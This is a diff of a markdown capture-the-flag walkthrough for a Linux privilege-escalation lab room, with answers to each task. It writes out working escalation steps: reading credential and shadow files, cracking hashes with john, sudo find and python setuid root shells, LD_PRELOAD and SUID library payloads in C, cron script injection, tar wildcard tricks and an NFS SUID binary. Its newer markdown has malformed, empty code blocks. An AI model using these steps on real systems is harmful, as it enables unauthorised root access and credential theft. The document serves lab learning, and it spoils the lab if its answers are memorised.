@@ -177,318 +177,342 @@ Dirty COW (CVE-2016-5195)
 
 ---
 
-# **🔷 TASK 4 — “What user’s credentials were exposed in the OpenVPN auth file?”**
+# ## TASK 4 — “What user’s credentials were exposed in the OpenVPN auth file?”
 
-## **Step 1 — View the OpenVPN auth file**
+### Step 1 — View the OpenVPN auth file
 
-`cat /etc/openvpn/auth.txt`
+```bash
+cat /etc/openvpn/auth.txt
+```
+This file contains stored VPN username/password in plaintext.
 
-**This file contains a username + password.**
-
-### ✅ **Answer:**
-
-**user**
+### Answer:
+```bash
+user
+```
 
 ---
 
-# **🔷 TASK 5 — “What was the password discovered in TCM’s bash history?”**
+# ## TASK 5 — “What was the password discovered in TCM’s bash history?”
 
-## **Step 1 — Read bash history**
-
+### Step 1 — Read bash history
+```bash
+```
 `cat ~/.bash_history | grep -i pass`
 
-**You will see a command like:**
+Searches the shell history for commands containing the word “pass”, often revealing credentials.
 
-`mysql -u root -p password123`
-
-### ✅ **Answer:**
-
-**password123**
+### Answer:
+```bash
+```
+`password123`
 
 ---
 
-# **🔷 TASK 6 — “What are the permissions on the /etc/shadow file?”**
+# ## TASK 6 — “What are the permissions on the /etc/shadow file?”
 
-## **Step 1 — List permissions**
-
+### Step 1 — List permissions
+```bash
+```
 `ls -l /etc/shadow`
 
-**Output (in this room):**
+Displays who can read/write the system’s hashed password file.
 
-`-rw-rw-r-- 1 root shadow ...`
-
-### ✅ **Answer:**
-
-**-rw-rw-r--**
+### Answer:
+```bash
+```
+`-rw-rw-r--`
 
 ---
 
-# **🔷 TASK 7 — “What is the full path of the private key file you discovered?”**
+# ## TASK 7 — “What is the full path of the private key file you discovered?”
 
-## **Step 1 — Search for private SSH keys**
-
+### Step 1 — Search for private SSH keys
+```bash
+```
 `find / -name id_rsa 2>/dev/null`
 
-**Discovered file:**
+Searches the entire filesystem for private RSA SSH keys.
 
+### Answer:
+```bash
+```
 `/backups/supersecretkeys/id_rsa`
 
-### **Step 2 — Use the key (optional for exploitation)**
-
-`chmod 600 id_rsa ssh -i id_rsa root@<MACHINE_IP>`
-
-### ✅ **Answer:**
-
-**/backups/supersecretkeys/id_rsa**
-
 ---
 
-# **🔷 TASK 8 — “What program does TCM have sudo privileges to run?”**
+# ## TASK 8 — “What program does TCM have sudo privileges to run?”
 
-## **Step 1 — Check sudo privileges**
-
+### Step 1 — Check sudo privileges
+```bash
+```
 `sudo -l`
 
-**Output shows:**
+Lists commands the current user can run as root without a password.
+```bash
+```
+`sudo find . -exec /bin/sh \;`
 
-`(tcm) NOPASSWD: /usr/bin/find`
+Uses `find`'s `-exec` option to run a root shell.
 
-### **Exploitation — Escape to a root shell**
-
-`sudo find . -exec /bin/sh \; id`
-
-### ✅ **Answer:**
-
-**find**
+### Answer:
+```bash
+```
+`find`
 
 ---
 
-# **🔷 TASK 9 — “What is the root password?”**
+# ## TASK 9 — “What is the root password?”
 
-## **Step 1 — Abuse Apache config loading**
-
+### Step 1 — Abuse Apache config loading
+```bash
+```
 `sudo apache2 -f /etc/shadow`
 
-**Copy the root hash.**
+Forces Apache (running as root) to print the contents of `/etc/shadow`.
 
-## **Step 2 — Crack the hash**
+### Step 2 — Crack the hash
+```bash
+```
+`echo "<HASH>" > root.hash`
 
-`echo "<HASH>" > root.hash john root.hash --wordlist=/usr/share/wordlists/rockyou.txt`
+Stores the extracted root hash into a file.
+```bash
+```
+`john root.hash --wordlist=/usr/share/wordlists/rockyou.txt`
 
-**John will crack the password:**
+Uses John the Ripper to crack the root password.
 
-### ✅ **Answer:**
-
-**password123**
+### Answer:
+```bash
+```
+`password123`
 
 ---
 
-# **🔷 TASK 10 — “Exploit the LD_PRELOAD vulnerability. What is the name of the file you created?”**
+# ## TASK 10 — “Exploit the LD_PRELOAD vulnerability. What is the name of the file you created?”
 
-## **Step 1 — Create malicious .so**
+### Step 1 — Create malicious shared object
+```bash
+```
+`cat << 'EOF' > x.c ... EOF`
 
-`cat << 'EOF' > x.c #include <stdio.h> #include <stdlib.h> #include <sys/types.h> void _init() {     unsetenv("LD_PRELOAD");     setgid(0);     setuid(0);     system("/bin/bash"); } EOF`
+Creates a C file that spawns a root shell when loaded.
 
-## **Step 2 — Compile**
-
+### Step 2 — Compile
+```bash
+```
 `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
 
-## **Step 3 — Run vulnerable binary**
+Compiles the C file into a shared library (.so) for LD_PRELOAD injection.
 
-`sudo LD_PRELOAD=/tmp/x.so apache2 id`
+### Step 3 — Execute with sudo
+```bash
+```
+`sudo LD_PRELOAD=/tmp/x.so apache2`
 
-### ✅ **Answer:**
+Forces Apache to load your malicious `.so` file before executing.
 
-**x.so**
+### Answer:
+```bash
+```
+`x.so`
 
 ---
 
-# **🔷 TASK 11 — “What file did the SUID binary expect that we were able to hijack?”**
+# ## TASK 11 — “What file did the SUID binary expect that we were able to hijack?”
 
-## **Step 1 — Inspect SUID binary**
+### Step 1 — Inspect SUID binary
+```bash
+```
+`strings /usr/local/bin/suid-so`
 
-`find / -perm -4000 -type f 2>/dev/null strings /usr/local/bin/suid-so strace /usr/local/bin/suid-so 2>&1 | grep -i "open"`
+Reveals readable strings inside the binary.
+```bash
+```
+`strace /usr/local/bin/suid-so 2>&1 | grep -i open`
 
-**You see it attempts to load:**
+Shows system calls, including attempts to open missing `.so` files.
 
+**Binary looks for:**
+```bash
+```
 `/home/tcm/.config/libcalc.so`
 
-## **Step 2 — Create malicious library**
+### Step 2 — Create malicious library
+```bash
+```
+`mkdir -p /home/tcm/.config`
 
-`mkdir -p /home/tcm/.config cat << 'EOF' > /home/tcm/.config/libcalc.c #include <stdlib.h> static void inject() __attribute__((constructor)); void inject() {     system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash"); } EOF`
+Creates the directory expected by the program.
+```bash
+```
+`cat << 'EOF' > /home/tcm/.config/libcalc.c ... EOF`
 
-## **Step 3 — Compile**
+Creates a malicious `.so` that makes a SUID root bash shell.
 
+### Step 3 — Compile
+```bash
+```
 `gcc -shared -fPIC -o /home/tcm/.config/libcalc.so /home/tcm/.config/libcalc.c`
 
-## **Step 4 — Run**
+Compiles your malicious shared library.
 
-`/usr/local/bin/suid-so /tmp/bash -p`
+### Step 4 — Execute SUID binary
+```bash
+```
+`/usr/local/bin/suid-so`
 
-### ✅ **Answer:**
+Loads the malicious `.so` as root.
 
-**libcalc.so**
+### Answer:
+```bash
+```
+`libcalc.so`
 
 ---
 
-# **🔷 TASK 12 — “What CVE is being exploited?”**
+# ## TASK 12 — “What CVE is being exploited?”
 
-## **Step 1 — Check nginx version**
-
+### Step 1 — Check nginx version
+```bash
+```
 `nginx -v`
 
-**Version is vulnerable to:**
+Displays the currently running nginx version; used to check if vulnerable.
 
-**CVE-2016-1247**
-
-### **Full exploitation uses `nginxed-root.sh` script.**
-
-### ✅ **Answer:**
-
-**CVE-2016-1247**
+### Answer:
+```bash
+```
+`CVE-2016-1247`
 
 ---
 
-# **🔷 TASK 13 — “What is the last line shown in the ‘strings’ output?”**
+# ## TASK 13 — “What is the last line shown in the ‘strings’ output?”
 
-## **Step 1 — Run strings**
-
+### Step 1 — Run strings
+```bash
+```
 `strings /usr/local/bin/suid-env`
 
-**Last line is:**
+Shows the hardcoded commands inside the binary.
 
+### Answer:
+```bash
+```
 `service apache2 start`
 
-### **Exploit — PATH Hijack**
-
-`echo -e '#!/bin/bash\n/bin/bash' > /tmp/service chmod +x /tmp/service export PATH=/tmp:$PATH /usr/local/bin/suid-env`
-
-### Request Answer:
-
-### ✅ **Answer:**
-
-**service apache2 start**
-
 ---
 
-# **🔷 TASK 14 — “What is the last line shown in the ‘strings’ output?”**
+# ## TASK 14 — “What is the last line shown in the ‘strings’ output?”
 
-## **Step 1 — Run strings**
-
+### Step 1 — Run strings
+```bash
+```
 `strings /usr/local/bin/suid-env2`
 
-**Last line:**
+Same idea as previous: look at embedded commands.
 
+### Answer:
+```bash
+```
 `/usr/sbin/service apache2 start`
 
-## **Exploit — Function hijacking**
-
-`function /usr/sbin/service(){ /bin/bash; } export -f /usr/sbin/service /usr/local/bin/suid-env2`
-
-### ✅ **Answer:**
-
-**/usr/sbin/service apache2 start**
-
 ---
 
-# **🔷 TASK 15 — “What file has the ‘cap_setuid’ capability set?”**
+# ## TASK 15 — “What file has the ‘cap_setuid’ capability set?”
 
-## **Step 1 — Scan capabilities**
-
+### Step 1 — List capabilities
+```bash
+```
 `getcap -r / 2>/dev/null`
 
-**Output:**
+Searches for binaries with special Linux capabilities (like setting UID).
 
-`/usr/bin/python2.6 = cap_setuid+ep`
+### Answer:
+```bash
+```
+`/usr/bin/python2.6`
 
-### **Exploit**
-
+### Exploit
+```bash
+```
 `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
 
-### ✅ **Answer:**
-
-**/usr/bin/python2.6**
+Uses Python's ability to set UID to 0 (root) and run a shell.
 
 ---
 
-# **🔷 TASK 16 — “What is the name of the cron job script?”**
+# ## TASK 16 — “What is the name of the cron job script?”
 
-## **Step 1 — List crontab**
-
+### Step 1 — Check cron jobs
+```bash
+```
 `cat /etc/crontab`
 
-You will find:
+Displays system-wide cron tasks executed by root.
 
-`/usr/local/bin/overwrite.sh`
-
-### **Exploit — Overwrite the script**
-
-`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /usr/local/bin/overwrite.sh # wait 1 minute /tmp/bash -p`
-
-### ✅ **Answer:**
-
-**overwrite.sh**
+### Answer:
+```bash
+```
+`overwrite.sh`
 
 ---
 
-# **🔷 TASK 17 — “What wildcard file did you create?”**
+# ## TASK 17 — “What wildcard file did you create?”
 
-### **Cron wildcard exploit script uses:**
+### Wildcard exploit files
+```bash
+```
+`touch /home/tcm/--checkpoint=1`
 
-`touch /home/tcm/--checkpoint=1 touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"`
+Creates a filename interpreted as an option by tar or rsync.
+```bash
+```
+`touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"`
 
-### **Your malicious wildcard file name:**
+Forces the cron job to execute your script.
 
-### ✅ **Answer:**
-
-**--checkpoint=1**
+### Answer:
+```bash
+```
+`--checkpoint=1`
 
 ---
 
-# **🔷 TASK 18 — “What file did you modify to gain root?”**
+# ## TASK 18 — “What file did you modify to gain root?”
 
-This task again uses logrotate or cron overwrite method.
-
-The file modified:
-
-`/usr/local/bin/overwrite.sh`
-
-### **Example exploit:**
-
+### Step 1 — Modify the cron script
+```bash
+```
 `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
 
-### ✅ **Answer:**
+Injects malicious code that runs as root during the cron job.
 
-**/usr/local/bin/overwrite.sh**
+### Answer:
+```bash
+```
+`/usr/local/bin/overwrite.sh`
 
 ---
 
-# **🔷 TASK 19 — “Which option must be set in /etc/exports to exploit NFS?”**
+# ## TASK 19 — “Which option must be set in /etc/exports to exploit NFS?”
 
-## **Step 1 — Read exports**
-
+### Step 1 — View NFS exports
+```bash
+```
 `cat /etc/exports`
 
-You will see:
+Displays exported directories and their permissions/options.
 
+### Required exploit option:
+```bash
+no_root_squash
+```
+
+This allows remote root users to remain root on mounted shares.
+
+### Answer:
+```bash
 `no_root_squash`
-
-### **Why:**
-
-This allows remote root user to act as root on shared NFS folders.
-
-### **Exploit example:**
-
-`showmount -e <TARGET_IP> mount -o rw,vers=2 <TARGET_IP>:/tmp /mnt`
-
-### Create SUID binary:
-
-`cat <<EOF > /mnt/x.c int main(){setuid(0); system("/bin/bash");} EOF  gcc /mnt/x.c -o /mnt/x chmod +s /mnt/x`
-
-Then run on target:
-
-`/tmp/x`
-
-### ✅ **Answer:**
-
-**no_root_squash**
+```
